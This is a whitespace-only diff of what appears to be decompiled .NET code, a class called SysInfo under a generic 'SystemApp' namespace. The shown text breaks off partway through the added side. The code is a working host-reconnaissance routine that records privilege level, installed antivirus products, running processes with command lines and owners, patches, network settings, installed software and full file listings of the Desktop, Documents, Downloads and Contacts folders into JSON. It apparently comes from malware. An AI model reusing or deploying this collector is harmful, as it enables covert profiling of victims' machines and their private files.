@@ -970,502 +970,502 @@ using Microsoft.Win32;
 using Newtonsoft.Json;
 namespace SystemApp
 {
-	// Token: 0x02000005 RID: 5
-	[ComVisible(true)]
-	internal class SysInfo
-	{
-		// Token: 0x06000028 RID: 40
-		[DllImport("advapi32.dll", SetLastError = true)]
-		private static extern bool GetTokenInformation(IntPtr tokenHandle, SysInfo.TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);
-		// Token: 0x06000029 RID: 41
-		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
-		private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);
-		// Token: 0x0600002A RID: 42 RVA: 0x0000353C File Offset: 0x0000173C
-		private static void WriteWmi(JsonTextWriter jsonWriter, string queryTable, string scope, string[] columns)
-		{
-			jsonWriter.WriteStartArray();
-			try
-			{
-				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(scope, "SELECT * FROM " + queryTable).Get())
-				{
-					ManagementObject managementObject = (ManagementObject)managementBaseObject;
-					jsonWriter.WriteStartObject();
-					foreach (string text in columns)
-					{
-						jsonWriter.WritePropertyName(text);
-						try
-						{
-							if (text != null && text == "ProcessOwner")
-							{
-								string[] array = new string[]
-								{
-									string.Empty,
-									string.Empty
-								};
-								ManagementObject managementObject2 = managementObject;
-								string methodName = "GetOwner";
-								object[] args = array;
-								if (Convert.ToInt32(managementObject2.InvokeMethod(methodName, args)) == 0){jsonWriter.WriteValue(array[1] + "\\" + array[0]);}
-								else{jsonWriter.WriteValue("NoOwner");}
-							}
-							else{jsonWriter.WriteValue(managementObject[text]);}
-						}
-						catch{jsonWriter.WriteValue("nota");}
-					}
-					jsonWriter.WriteEndObject();
-				}
-			}
-			catch (Exception ex)
-			{
-				jsonWriter.WriteStartObject();
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-				jsonWriter.WriteEndObject();
-			}
-			jsonWriter.WriteEndArray();
-		}
-		// Token: 0x0600002B RID: 43 RVA: 0x000036A4 File Offset: 0x000018A4
-		private static string GetPath(Guid guid)
-		{
-			IntPtr ptr;
-			if (SysInfo.SHGetKnownFolderPath(ref guid, 0, IntPtr.Zero, out ptr) == 0)
-			{
-				string result = Marshal.PtrToStringUni(ptr);
-				Marshal.FreeCoTaskMem(ptr);
-				return result;
-			}
-			return null;
-		}
-		// Token: 0x0600002C RID: 44 RVA: 0x000036D0 File Offset: 0x000018D0
-		private static void GetAllFiles(string path, List<string> files)
-		{
-			try
-			{
-				files.AddRange(Directory.GetFiles(path));
-				string[] directories = Directory.GetDirectories(path);
-				for (int i = 0; i < directories.Length; i++){SysInfo.GetAllFiles(directories[i], files);}
-			}
-			catch{}
-		}
-		// Token: 0x0600002D RID: 45 RVA: 0x0000371C File Offset: 0x0000191C
-		private static void WritePrivileges(JsonTextWriter jsonWriter)
-		{
-			jsonWriter.WritePropertyName("privileges");
-			jsonWriter.WriteStartObject();
-			try
-			{
-				bool flag = false;
-				bool flag2 = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
-				if (flag2){flag = true;}
-				else if (Environment.OSVersion.Version.Major >= 6)
-				{
-					int num = Marshal.SizeOf(typeof(int));
-					IntPtr intPtr = Marshal.AllocHGlobal(num);
-					try
-					{
-						if (!SysInfo.GetTokenInformation(WindowsIdentity.GetCurrent().Token, SysInfo.TokenInformationClass.TokenElevationType, intPtr, num, out num))
-						{
-							throw Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());
-						}
-						SysInfo.TokenElevationType tokenElevationType = (SysInfo.TokenElevationType)Marshal.ReadInt32(intPtr);
-						if (tokenElevationType != SysInfo.TokenElevationType.TokenElevationTypeDefault && tokenElevationType - SysInfo.TokenElevationType.TokenElevationTypeFull <= 1){flag = true;}
-					}
-					finally{if (intPtr != IntPtr.Zero){Marshal.FreeHGlobal(intPtr);}}
-				}
-				jsonWriter.WritePropertyName("IsInAdminGroup");
-				jsonWriter.WriteValue(flag ? "Yes" : "No");
-				jsonWriter.WritePropertyName("IsAdminPrivilege");
-				jsonWriter.WriteValue(flag2 ? "Yes" : "No");
-			}
-			catch (Exception ex)
-			{
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-			}
-			jsonWriter.WriteEndObject();
-		}
-		// Token: 0x0600002E RID: 46 RVA: 0x00003850 File Offset: 0x00001A50
-		private static void WriteSysInfo(JsonTextWriter jsonWriter)
-		{
-			jsonWriter.WritePropertyName("sysInfo");
-			jsonWriter.WriteStartObject();
-			jsonWriter.WritePropertyName("userAccount");
-			SysInfo.WriteWmi(jsonWriter, "Win32_userAccount", "root\\cimv2", new string[]
-			{
-				"name"
-			});
-			jsonWriter.WritePropertyName("computerSystem");
-			SysInfo.WriteWmi(jsonWriter, "Win32_computerSystem", "root\\cimv2", new string[]
-			{
-				"Caption",
-				"UserName",
-				"Manufacturer",
-				"Model",
-				"PrimaryOwnerName",
-				"TotalPhysicalMemory"
-			});
-			jsonWriter.WritePropertyName("antiVirusProduct");
-			SysInfo.WriteWmi(jsonWriter, "antiVirusProduct", "root\\SecurityCenter2", new string[]
-			{
-				"displayName",
-				"ProductState",
-				"TimeStamp"
-			});
-			jsonWriter.WritePropertyName("antiSpywareProduct");
-			SysInfo.WriteWmi(jsonWriter, "antiSpywareProduct", "root\\SecurityCenter2", new string[]
-			{
-				"displayName",
-				"ProductState",
-				"TimeStamp"
-			});
-			jsonWriter.WritePropertyName("process");
-			SysInfo.WriteWmi(jsonWriter, "Win32_process", "root\\cimv2", new string[]
-			{
-				"Name",
-				"CommandLine",
-				"ProcessOwner"
-			});
-			jsonWriter.WritePropertyName("processor");
-			SysInfo.WriteWmi(jsonWriter, "Win32_processor", "root\\cimv2", new string[]
-			{
-				"Caption",
-				"Name",
-				"Architecture",
-				"NumberOfCores",
-				"NumberOfLogicalProcessors",
-				"ProcessorId",
-				"CurrentClockSpeed",
-				"MaximumClockSpeed",
-				"DataWidth"
-			});
-			jsonWriter.WritePropertyName("operatingSystem");
-			SysInfo.WriteWmi(jsonWriter, "Win32_operatingSystem", "root\\cimv2", new string[]
-			{
-				"Caption",
-				"version",
-				"RegisteredUser",
-				"BuildNumber",
-				"ServicePackMajorVersion",
-				"ServicePackMinorVersion",
-				"OSArchitecture",
-				"OSProductSuite"
-			});
-			jsonWriter.WritePropertyName("timeZone");
-			SysInfo.WriteWmi(jsonWriter, "Win32_timeZone", "root\\cimv2", new string[]
-			{
-				"Caption",
-				"description",
-				"StandardName"
-			});
-			jsonWriter.WritePropertyName("quickFixEngineering");
-			SysInfo.WriteWmi(jsonWriter, "Win32_quickFixEngineering", "root\\cimv2", new string[]
-			{
-				"HotFixID",
-				"Description",
-				"InstalledOn"
-			});
-			jsonWriter.WritePropertyName("network");
-			jsonWriter.WriteStartArray();
-			try
-			{
-				foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
-				{
-					jsonWriter.WriteStartObject();
-					jsonWriter.WritePropertyName("name");
-					jsonWriter.WriteValue(networkInterface.Name);
-					jsonWriter.WritePropertyName("description");
-					jsonWriter.WriteValue(networkInterface.Description);
-					jsonWriter.WritePropertyName("networkInterfaceType");
-					jsonWriter.WriteValue(networkInterface.NetworkInterfaceType.ToString());
-					jsonWriter.WritePropertyName("operationalStatus");
-					jsonWriter.WriteValue(networkInterface.OperationalStatus.ToString());
-					jsonWriter.WritePropertyName("speed");
-					jsonWriter.WriteValue(networkInterface.Speed);
-					jsonWriter.WritePropertyName("macAddress");
-					jsonWriter.WriteValue(BitConverter.ToString(networkInterface.GetPhysicalAddress().GetAddressBytes()));
-					IPInterfaceProperties ipproperties = networkInterface.GetIPProperties();
-					if (networkInterface.Supports(NetworkInterfaceComponent.IPv4))
-					{
-						jsonWriter.WritePropertyName("isDhcpEnabled");
-						jsonWriter.WriteValue(ipproperties.GetIPv4Properties().IsDhcpEnabled);
-					}
-					jsonWriter.WritePropertyName("dhcpServers");
-					jsonWriter.WriteStartArray();
-					foreach (IPAddress ipaddress in ipproperties.DhcpServerAddresses){jsonWriter.WriteValue(ipaddress.ToString());}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WritePropertyName("dnsAddresses");
-					jsonWriter.WriteStartArray();
-					foreach (IPAddress ipaddress2 in ipproperties.DnsAddresses){jsonWriter.WriteValue(ipaddress2.ToString());}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WritePropertyName("winsAddresses");
-					jsonWriter.WriteStartArray();
-					foreach (IPAddress ipaddress3 in ipproperties.WinsServersAddresses){jsonWriter.WriteValue(ipaddress3.ToString());}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WritePropertyName("gatewayAddresses");
-					jsonWriter.WriteStartArray();
-					foreach (GatewayIPAddressInformation gatewayIPAddressInformation in ipproperties.GatewayAddresses){jsonWriter.WriteValue(gatewayIPAddressInformation.Address.ToString());}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WritePropertyName("ipAddresses");
-					jsonWriter.WriteStartArray();
-					foreach (UnicastIPAddressInformation unicastIPAddressInformation in ipproperties.UnicastAddresses)
-					{
-						jsonWriter.WriteStartObject();
-						jsonWriter.WritePropertyName("address");
-						jsonWriter.WriteValue(unicastIPAddressInformation.Address.ToString());
-						AddressFamily addressFamily = unicastIPAddressInformation.Address.AddressFamily;
-						if (addressFamily != AddressFamily.InterNetwork)
-						{
-							if (addressFamily == AddressFamily.InterNetworkV6)
-							{
-								jsonWriter.WritePropertyName("prefixOrigin");
-								jsonWriter.WriteValue(unicastIPAddressInformation.PrefixOrigin.ToString());
-							}
-						}
-						else
-						{
-							jsonWriter.WritePropertyName("subnetMask");
-							jsonWriter.WriteValue(unicastIPAddressInformation.IPv4Mask.ToString());
-						}
-						jsonWriter.WriteEndObject();
-					}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WriteEndObject();
-				}
-			}
-			catch (Exception ex)
-			{
-				jsonWriter.WriteStartObject();
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-				jsonWriter.WriteEndObject();
-			}
-			jsonWriter.WriteEndArray();
-			jsonWriter.WriteEndObject();
-		}
-		// Token: 0x0600002F RID: 47 RVA: 0x00003EDC File Offset: 0x000020DC
-		private static void WriteDirectoryListing(JsonTextWriter jsonWriter)
-		{
-			jsonWriter.WritePropertyName("dirList");
-			jsonWriter.WriteStartArray();
-			try
-			{
-				foreach (string text in new List<string>
-				{
-					SysInfo.GetPath(SysInfo.Desktop),
-					SysInfo.GetPath(SysInfo.Documents),
-					SysInfo.GetPath(SysInfo.Downloads),
-					SysInfo.GetPath(SysInfo.Contacts)
-				})
-				{
-					jsonWriter.WriteStartObject();
-					jsonWriter.WritePropertyName(text);
-					jsonWriter.WriteStartArray();
-					if (Directory.Exists(text))
-					{
-						List<string> list = new List<string>();
-						SysInfo.GetAllFiles(text, list);
-						foreach (string text2 in list){jsonWriter.WriteValue(text2);}
-					}
-					jsonWriter.WriteEndArray();
-					jsonWriter.WriteEndObject();
-				}
-			}
-			catch (Exception ex){
-				jsonWriter.WriteStartObject();
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-				jsonWriter.WriteEndObject();
-			}
-			jsonWriter.WriteEndArray();
-		}
-		// Token: 0x06000030 RID: 48 RVA: 0x00004028 File Offset: 0x00002228
-		private static void WriteDriveInfo(JsonTextWriter jsonWriter)
-		{
-			jsonWriter.WritePropertyName("driveInfo");
-			jsonWriter.WriteStartArray();
-			try
-			{
-				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
-				{
-					jsonWriter.WriteStartObject();
-					jsonWriter.WritePropertyName("Path");
-					jsonWriter.WriteValue(driveInfo.Name);
-					jsonWriter.WritePropertyName("type");
-					jsonWriter.WriteValue(driveInfo.DriveType.ToString());
-					jsonWriter.WritePropertyName("isReady");
-					jsonWriter.WriteValue(driveInfo.IsReady);
-					if (driveInfo.IsReady)
-					{
-						jsonWriter.WritePropertyName("TotalSize");
-						jsonWriter.WriteValue(driveInfo.TotalSize);
-						jsonWriter.WritePropertyName("FreeSpace");
-						jsonWriter.WriteValue(driveInfo.TotalFreeSpace);
-						jsonWriter.WritePropertyName("availableFreeSpace");
-						jsonWriter.WriteValue(driveInfo.AvailableFreeSpace);
-						jsonWriter.WritePropertyName("driveFormat");
-						jsonWriter.WriteValue(driveInfo.DriveFormat);
-						jsonWriter.WritePropertyName("volumeLabel");
-						jsonWriter.WriteValue(driveInfo.VolumeLabel);
-					}
-					jsonWriter.WriteEndObject();
-				}
-			}
-			catch (Exception ex)
-			{
-				jsonWriter.WriteStartObject();
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-				jsonWriter.WriteEndObject();
-			}
-			jsonWriter.WriteEndArray();
-		}
-		// Token: 0x06000031 RID: 49 RVA: 0x00004180 File Offset: 0x00002380
-		private static void WriteInstalledApps(JsonTextWriter jsonWriter)
-		{
-			jsonWriter.WritePropertyName("installedApps");
-			jsonWriter.WriteStartArray();
-			try
-			{
-				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
-				{
-					foreach (string name in registryKey.GetSubKeyNames())
-					{
-						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
-						{
-							if (registryKey2 != null)
-							{
-								string text = registryKey2.GetValue("DisplayName") as string;
-								if (text != null)
-								{
-									jsonWriter.WriteStartObject();
-									jsonWriter.WritePropertyName("Name");
-									jsonWriter.WriteValue(text);
-									jsonWriter.WritePropertyName("Version");
-									jsonWriter.WriteValue(registryKey2.GetValue("DisplayVersion"));
-									jsonWriter.WriteEndObject();
-								}
-							}
-						}
-					}
-				}
-			}
-			catch (Exception ex)
-			{
-				jsonWriter.WriteStartObject();
-				jsonWriter.WritePropertyName("error");
-				jsonWriter.WriteValue(ex.ToString());
-				jsonWriter.WriteEndObject();
-			}
-			jsonWriter.WriteEndArray();
-		}
-		// Token: 0x06000032 RID: 50 RVA: 0x0000429C File Offset: 0x0000249C
-		public static void WriteTo(Stream s)
-		{
-			JsonTextWriter jsonTextWriter = new JsonTextWriter(new StreamWriter(s, Encoding.UTF8));
-			jsonTextWriter.WriteStartObject();
-			SysInfo.WritePrivileges(jsonTextWriter);
-			SysInfo.WriteSysInfo(jsonTextWriter);
-			SysInfo.WriteDirectoryListing(jsonTextWriter);
-			SysInfo.WriteDriveInfo(jsonTextWriter);
-			SysInfo.WriteInstalledApps(jsonTextWriter);
-			jsonTextWriter.WriteEndObject();
-			jsonTextWriter.Flush();
-		}
-		// Token: 0x04000014 RID: 20
-		private static readonly Guid Contacts = new Guid("{56784854-C6CB-462B-8169-88E350ACB882}");
-		// Token: 0x04000015 RID: 21
-		private static readonly Guid Desktop = new Guid("{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}");
-		// Token: 0x04000016 RID: 22
-		private static readonly Guid Documents = new Guid("{FDD39AD0-238F-46AF-ADB4-6C85480369C7}");
-		// Token: 0x04000017 RID: 23
-		private static readonly Guid Downloads = new Guid("{374DE290-123F-4565-9164-39C4925E467B}");
-		// Token: 0x04000018 RID: 24
-		private static readonly Guid Favorites = new Guid("{1777F761-68AD-4D8A-87BD-30B759FA33DD}");
-		// Token: 0x04000019 RID: 25
-		private static readonly Guid Links = new Guid("{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}");
-		// Token: 0x0400001A RID: 26
-		private static readonly Guid Music = new Guid("{4BD8D571-6D19-48D3-BE97-422220080E43}");
-		// Token: 0x0400001B RID: 27
-		private static readonly Guid Pictures = new Guid("{33E28130-4E1E-4676-835A-98395C3BC3BB}");
-		// Token: 0x0400001C RID: 28
-		private static readonly Guid SavedGames = new Guid("{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}");
-		// Token: 0x0400001D RID: 29
-		private static readonly Guid SavedSearches = new Guid("{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}");
-		// Token: 0x0400001E RID: 30
-		private static readonly Guid Videos = new Guid("{18989B1D-99B5-455B-841C-AB7C74E4DDFC}");
-		// Token: 0x0200000C RID: 12
-		private enum TokenInformationClass
-		{
-			// Token: 0x0400002B RID: 43
-			TokenUser = 1,
-			// Token: 0x0400002C RID: 44
-			TokenGroups,
-			// Token: 0x0400002D RID: 45
-			TokenPrivileges,
-			// Token: 0x0400002E RID: 46
-			TokenOwner,
-			// Token: 0x0400002F RID: 47
-			TokenPrimaryGroup,
-			// Token: 0x04000030 RID: 48
-			TokenDefaultDacl,
-			// Token: 0x04000031 RID: 49
-			TokenSource,
-			// Token: 0x04000032 RID: 50
-			TokenType,
-			// Token: 0x04000033 RID: 51
-			TokenImpersonationLevel,
-			// Token: 0x04000034 RID: 52
-			TokenStatistics,
-			// Token: 0x04000035 RID: 53
-			TokenRestrictedSids,
-			// Token: 0x04000036 RID: 54
-			TokenSessionId,
-			// Token: 0x04000037 RID: 55
-			TokenGroupsAndPrivileges,
-			// Token: 0x04000038 RID: 56
-			TokenSessionReference,
-			// Token: 0x04000039 RID: 57
-			TokenSandBoxInert,
-			// Token: 0x0400003A RID: 58
-			TokenAuditPolicy,
-			// Token: 0x0400003B RID: 59
-			TokenOrigin,
-			// Token: 0x0400003C RID: 60
-			TokenElevationType,
-			// Token: 0x0400003D RID: 61
-			TokenLinkedToken,
-			// Token: 0x0400003E RID: 62
-			TokenElevation,
-			// Token: 0x0400003F RID: 63
-			TokenHasRestrictions,
-			// Token: 0x04000040 RID: 64
-			TokenAccessInformation,
-			// Token: 0x04000041 RID: 65
-			TokenVirtualizationAllowed,
-			// Token: 0x04000042 RID: 66
-			TokenVirtualizationEnabled,
-			// Token: 0x04000043 RID: 67
-			TokenIntegrityLevel,
-			// Token: 0x04000044 RID: 68
-			TokenUiAccess,
-			// Token: 0x04000045 RID: 69
-			TokenMandatoryPolicy,
-			// Token: 0x04000046 RID: 70
-			TokenLogonSid,
-			// Token: 0x04000047 RID: 71
-			MaxTokenInfoClass
-		}
-		// Token: 0x0200000D RID: 13
-		private enum TokenElevationType
-		{
-			// Token: 0x04000049 RID: 73
-			TokenElevationTypeDefault = 1,
-			// Token: 0x0400004A RID: 74
-			TokenElevationTypeFull,
-			// Token: 0x0400004B RID: 75
-			TokenElevationTypeLimited
-		}
-	}
+ // Token: 0x02000005 RID: 5
+ [ComVisible(true)]
+ internal class SysInfo
+ {
+  // Token: 0x06000028 RID: 40
+  [DllImport("advapi32.dll", SetLastError = true)]
+  private static extern bool GetTokenInformation(IntPtr tokenHandle, SysInfo.TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);
+  // Token: 0x06000029 RID: 41
+  [DllImport("shell32.dll", CharSet = CharSet.Auto)]
+  private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);
+  // Token: 0x0600002A RID: 42 RVA: 0x0000353C File Offset: 0x0000173C
+  private static void WriteWmi(JsonTextWriter jsonWriter, string queryTable, string scope, string[] columns)
+  {
+   jsonWriter.WriteStartArray();
+   try
+   {
+    foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(scope, "SELECT * FROM " + queryTable).Get())
+    {
+     ManagementObject managementObject = (ManagementObject)managementBaseObject;
+     jsonWriter.WriteStartObject();
+     foreach (string text in columns)
+     {
+      jsonWriter.WritePropertyName(text);
+      try
+      {
+       if (text != null && text == "ProcessOwner")
+       {
+        string[] array = new string[]
+        {
+         string.Empty,
+         string.Empty
+        };
+        ManagementObject managementObject2 = managementObject;
+        string methodName = "GetOwner";
+        object[] args = array;
+        if (Convert.ToInt32(managementObject2.InvokeMethod(methodName, args)) == 0){jsonWriter.WriteValue(array[1] + "\\" + array[0]);}
+        else{jsonWriter.WriteValue("NoOwner");}
+       }
+       else{jsonWriter.WriteValue(managementObject[text]);}
+      }
+      catch{jsonWriter.WriteValue("nota");}
+     }
+     jsonWriter.WriteEndObject();
+    }
+   }
+   catch (Exception ex)
+   {
+    jsonWriter.WriteStartObject();
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+    jsonWriter.WriteEndObject();
+   }
+   jsonWriter.WriteEndArray();
+  }
+  // Token: 0x0600002B RID: 43 RVA: 0x000036A4 File Offset: 0x000018A4
+  private static string GetPath(Guid guid)
+  {
+   IntPtr ptr;
+   if (SysInfo.SHGetKnownFolderPath(ref guid, 0, IntPtr.Zero, out ptr) == 0)
+   {
+    string result = Marshal.PtrToStringUni(ptr);
+    Marshal.FreeCoTaskMem(ptr);
+    return result;
+   }
+   return null;
+  }
+  // Token: 0x0600002C RID: 44 RVA: 0x000036D0 File Offset: 0x000018D0
+  private static void GetAllFiles(string path, List<string> files)
+  {
+   try
+   {
+    files.AddRange(Directory.GetFiles(path));
+    string[] directories = Directory.GetDirectories(path);
+    for (int i = 0; i < directories.Length; i++){SysInfo.GetAllFiles(directories[i], files);}
+   }
+   catch{}
+  }
+  // Token: 0x0600002D RID: 45 RVA: 0x0000371C File Offset: 0x0000191C
+  private static void WritePrivileges(JsonTextWriter jsonWriter)
+  {
+   jsonWriter.WritePropertyName("privileges");
+   jsonWriter.WriteStartObject();
+   try
+   {
+    bool flag = false;
+    bool flag2 = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+    if (flag2){flag = true;}
+    else if (Environment.OSVersion.Version.Major >= 6)
+    {
+     int num = Marshal.SizeOf(typeof(int));
+     IntPtr intPtr = Marshal.AllocHGlobal(num);
+     try
+     {
+      if (!SysInfo.GetTokenInformation(WindowsIdentity.GetCurrent().Token, SysInfo.TokenInformationClass.TokenElevationType, intPtr, num, out num))
+      {
+       throw Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());
+      }
+      SysInfo.TokenElevationType tokenElevationType = (SysInfo.TokenElevationType)Marshal.ReadInt32(intPtr);
+      if (tokenElevationType != SysInfo.TokenElevationType.TokenElevationTypeDefault && tokenElevationType - SysInfo.TokenElevationType.TokenElevationTypeFull <= 1){flag = true;}
+     }
+     finally{if (intPtr != IntPtr.Zero){Marshal.FreeHGlobal(intPtr);}}
+    }
+    jsonWriter.WritePropertyName("IsInAdminGroup");
+    jsonWriter.WriteValue(flag ? "Yes" : "No");
+    jsonWriter.WritePropertyName("IsAdminPrivilege");
+    jsonWriter.WriteValue(flag2 ? "Yes" : "No");
+   }
+   catch (Exception ex)
+   {
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+   }
+   jsonWriter.WriteEndObject();
+  }
+  // Token: 0x0600002E RID: 46 RVA: 0x00003850 File Offset: 0x00001A50
+  private static void WriteSysInfo(JsonTextWriter jsonWriter)
+  {
+   jsonWriter.WritePropertyName("sysInfo");
+   jsonWriter.WriteStartObject();
+   jsonWriter.WritePropertyName("userAccount");
+   SysInfo.WriteWmi(jsonWriter, "Win32_userAccount", "root\\cimv2", new string[]
+   {
+    "name"
+   });
+   jsonWriter.WritePropertyName("computerSystem");
+   SysInfo.WriteWmi(jsonWriter, "Win32_computerSystem", "root\\cimv2", new string[]
+   {
+    "Caption",
+    "UserName",
+    "Manufacturer",
+    "Model",
+    "PrimaryOwnerName",
+    "TotalPhysicalMemory"
+   });
+   jsonWriter.WritePropertyName("antiVirusProduct");
+   SysInfo.WriteWmi(jsonWriter, "antiVirusProduct", "root\\SecurityCenter2", new string[]
+   {
+    "displayName",
+    "ProductState",
+    "TimeStamp"
+   });
+   jsonWriter.WritePropertyName("antiSpywareProduct");
+   SysInfo.WriteWmi(jsonWriter, "antiSpywareProduct", "root\\SecurityCenter2", new string[]
+   {
+    "displayName",
+    "ProductState",
+    "TimeStamp"
+   });
+   jsonWriter.WritePropertyName("process");
+   SysInfo.WriteWmi(jsonWriter, "Win32_process", "root\\cimv2", new string[]
+   {
+    "Name",
+    "CommandLine",
+    "ProcessOwner"
+   });
+   jsonWriter.WritePropertyName("processor");
+   SysInfo.WriteWmi(jsonWriter, "Win32_processor", "root\\cimv2", new string[]
+   {
+    "Caption",
+    "Name",
+    "Architecture",
+    "NumberOfCores",
+    "NumberOfLogicalProcessors",
+    "ProcessorId",
+    "CurrentClockSpeed",
+    "MaximumClockSpeed",
+    "DataWidth"
+   });
+   jsonWriter.WritePropertyName("operatingSystem");
+   SysInfo.WriteWmi(jsonWriter, "Win32_operatingSystem", "root\\cimv2", new string[]
+   {
+    "Caption",
+    "version",
+    "RegisteredUser",
+    "BuildNumber",
+    "ServicePackMajorVersion",
+    "ServicePackMinorVersion",
+    "OSArchitecture",
+    "OSProductSuite"
+   });
+   jsonWriter.WritePropertyName("timeZone");
+   SysInfo.WriteWmi(jsonWriter, "Win32_timeZone", "root\\cimv2", new string[]
+   {
+    "Caption",
+    "description",
+    "StandardName"
+   });
+   jsonWriter.WritePropertyName("quickFixEngineering");
+   SysInfo.WriteWmi(jsonWriter, "Win32_quickFixEngineering", "root\\cimv2", new string[]
+   {
+    "HotFixID",
+    "Description",
+    "InstalledOn"
+   });
+   jsonWriter.WritePropertyName("network");
+   jsonWriter.WriteStartArray();
+   try
+   {
+    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
+    {
+     jsonWriter.WriteStartObject();
+     jsonWriter.WritePropertyName("name");
+     jsonWriter.WriteValue(networkInterface.Name);
+     jsonWriter.WritePropertyName("description");
+     jsonWriter.WriteValue(networkInterface.Description);
+     jsonWriter.WritePropertyName("networkInterfaceType");
+     jsonWriter.WriteValue(networkInterface.NetworkInterfaceType.ToString());
+     jsonWriter.WritePropertyName("operationalStatus");
+     jsonWriter.WriteValue(networkInterface.OperationalStatus.ToString());
+     jsonWriter.WritePropertyName("speed");
+     jsonWriter.WriteValue(networkInterface.Speed);
+     jsonWriter.WritePropertyName("macAddress");
+     jsonWriter.WriteValue(BitConverter.ToString(networkInterface.GetPhysicalAddress().GetAddressBytes()));
+     IPInterfaceProperties ipproperties = networkInterface.GetIPProperties();
+     if (networkInterface.Supports(NetworkInterfaceComponent.IPv4))
+     {
+      jsonWriter.WritePropertyName("isDhcpEnabled");
+      jsonWriter.WriteValue(ipproperties.GetIPv4Properties().IsDhcpEnabled);
+     }
+     jsonWriter.WritePropertyName("dhcpServers");
+     jsonWriter.WriteStartArray();
+     foreach (IPAddress ipaddress in ipproperties.DhcpServerAddresses){jsonWriter.WriteValue(ipaddress.ToString());}
+     jsonWriter.WriteEndArray();
+     jsonWriter.WritePropertyName("dnsAddresses");
+     jsonWriter.WriteStartArray();
+     foreach (IPAddress ipaddress2 in ipproperties.DnsAddresses){jsonWriter.WriteValue(ipaddress2.ToString());}
+     jsonWriter.WriteEndArray();
+     jsonWriter.WritePropertyName("winsAddresses");
+     jsonWriter.WriteStartArray();
+     foreach (IPAddress ipaddress3 in ipproperties.WinsServersAddresses){jsonWriter.WriteValue(ipaddress3.ToString());}
+     jsonWriter.WriteEndArray();
+     jsonWriter.WritePropertyName("gatewayAddresses");
+     jsonWriter.WriteStartArray();
+     foreach (GatewayIPAddressInformation gatewayIPAddressInformation in ipproperties.GatewayAddresses){jsonWriter.WriteValue(gatewayIPAddressInformation.Address.ToString());}
+     jsonWriter.WriteEndArray();
+     jsonWriter.WritePropertyName("ipAddresses");
+     jsonWriter.WriteStartArray();
+     foreach (UnicastIPAddressInformation unicastIPAddressInformation in ipproperties.UnicastAddresses)
+     {
+      jsonWriter.WriteStartObject();
+      jsonWriter.WritePropertyName("address");
+      jsonWriter.WriteValue(unicastIPAddressInformation.Address.ToString());
+      AddressFamily addressFamily = unicastIPAddressInformation.Address.AddressFamily;
+      if (addressFamily != AddressFamily.InterNetwork)
+      {
+       if (addressFamily == AddressFamily.InterNetworkV6)
+       {
+        jsonWriter.WritePropertyName("prefixOrigin");
+        jsonWriter.WriteValue(unicastIPAddressInformation.PrefixOrigin.ToString());
+       }
+      }
+      else
+      {
+       jsonWriter.WritePropertyName("subnetMask");
+       jsonWriter.WriteValue(unicastIPAddressInformation.IPv4Mask.ToString());
+      }
+      jsonWriter.WriteEndObject();
+     }
+     jsonWriter.WriteEndArray();
+     jsonWriter.WriteEndObject();
+    }
+   }
+   catch (Exception ex)
+   {
+    jsonWriter.WriteStartObject();
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+    jsonWriter.WriteEndObject();
+   }
+   jsonWriter.WriteEndArray();
+   jsonWriter.WriteEndObject();
+  }
+  // Token: 0x0600002F RID: 47 RVA: 0x00003EDC File Offset: 0x000020DC
+  private static void WriteDirectoryListing(JsonTextWriter jsonWriter)
+  {
+   jsonWriter.WritePropertyName("dirList");
+   jsonWriter.WriteStartArray();
+   try
+   {
+    foreach (string text in new List<string>
+    {
+     SysInfo.GetPath(SysInfo.Desktop),
+     SysInfo.GetPath(SysInfo.Documents),
+     SysInfo.GetPath(SysInfo.Downloads),
+     SysInfo.GetPath(SysInfo.Contacts)
+    })
+    {
+     jsonWriter.WriteStartObject();
+     jsonWriter.WritePropertyName(text);
+     jsonWriter.WriteStartArray();
+     if (Directory.Exists(text))
+     {
+      List<string> list = new List<string>();
+      SysInfo.GetAllFiles(text, list);
+      foreach (string text2 in list){jsonWriter.WriteValue(text2);}
+     }
+     jsonWriter.WriteEndArray();
+     jsonWriter.WriteEndObject();
+    }
+   }
+   catch (Exception ex){
+    jsonWriter.WriteStartObject();
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+    jsonWriter.WriteEndObject();
+   }
+   jsonWriter.WriteEndArray();
+  }
+  // Token: 0x06000030 RID: 48 RVA: 0x00004028 File Offset: 0x00002228
